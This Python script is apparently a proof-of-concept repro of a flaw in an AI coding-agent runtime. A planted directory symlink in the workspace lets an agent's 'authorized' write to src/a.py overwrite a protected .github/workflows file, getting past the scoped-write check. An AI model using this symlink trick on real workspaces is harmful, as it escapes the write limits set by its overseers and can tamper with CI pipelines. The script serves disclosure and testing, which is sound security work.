"""Repro: ScopedRepairBackend._authorize checks the *lexical* path against
allowed_paths and only requires the resolved path to stay inside the workspace.
A pre-existing directory symlink in the (untrusted) workspace redirects an
authorized write ("src/a.py") onto a non-authorized file (".github/workflows/a.py").
Legacy (FALLBACK, no core binding) worker_run never runs _workspace_path_has_symlink."""
import sys, tempfile, os
from pathlib import Path
from types import SimpleNamespace
sys.path.insert(0, "/home/user/nexus-open-swe-runtime")
from nexus_open_swe_runtime import cli
from deepagents.backends.filesystem import FilesystemBackend


class FakeGraph:
    def __init__(self, surface, output=None, effect=None):
        self.surface, self.output, self.effect = tuple(surface), output, effect
    def get_graph(self):
        tools = {n: object() for n in self.surface}
        return SimpleNamespace(nodes={"tools": SimpleNamespace(data=SimpleNamespace(tools_by_name=tools))})
    def invoke(self, _payload, config=None):
        if self.effect: self.effect()
        return self.output

def record(name, env):
    return {"messages": [SimpleNamespace(tool_calls=[{"name": name, "args": {"envelope": env}}])]}

tmp = Path(tempfile.mkdtemp())
ws = tmp / "workspace"; ws.mkdir()
(ws / ".github" / "workflows").mkdir(parents=True)
(ws / ".github" / "workflows" / "a.py").write_text("PROTECTED = True\n")
os.symlink(".github/workflows", ws / "src")            # repo-controlled dir symlink
art = tmp / "evidence.json"; art.write_text('{"schema":"external_execution_envelope.v1","failure":"x"}\n')
req = {
    "schema": cli.REQUEST_SCHEMA, "operation": "worker_run", "operation_id": "d" * 64,
    "provider_id": "google_genai", "model_id": "m",
    "runtime_state_root": str(tmp / "state"), "workspace_path": str(ws), "artifact_path": str(art),
    "prompt": "task_id=task-1\nunit_id=u1\nauthorized_mutation_paths=[\"src/a.py\"]\nbounded repair",
    "session_id": "", "worker_identity_sha256": "c" * 64,
}

def repair_factory(model, workspace, runtime, allowed_paths, key, effect_journal=None, composite=False):
    backend = cli.ScopedRepairBackend(FilesystemBackend(root_dir=workspace, virtual_mode=True),
                                      workspace, allowed_paths, effect_journal)
    def effect():
        effect_journal.bind_turn("turn-1", "call-1")   # what the model transport does per tool call
        try:
            backend.write("src/a.py", "PROTECTED = False\n")
        except Exception as e:
            print("write raised:", type(e).__name__, e)
    return FakeGraph(cli.REPAIR_TOOLS, record("record_worker_result", {"summary": "done"}), effect)

diag = FakeGraph(cli.DIAGNOSIS_TOOLS, record("record_diagnosis", {"status": "ROOT_CAUSE_SUPPORTED", "summary": "s", "evidence_paths": ["src/a.py"]}))
res = cli._worker_run(req, runtime_loader=lambda: {"human_message": lambda content: content},
                      model_factory=lambda *a: object(), diagnosis_factory=lambda *a, **k: diag,
                      repair_factory=repair_factory)
print("status:", res["status"], "| core_binding_status:", res.get("core_binding_status"))
print(".github/workflows/a.py now:", (ws / ".github/workflows/a.py").read_text().strip())
print("is .github/workflows/a.py within allowed_paths ['src/a.py']? ->", False)
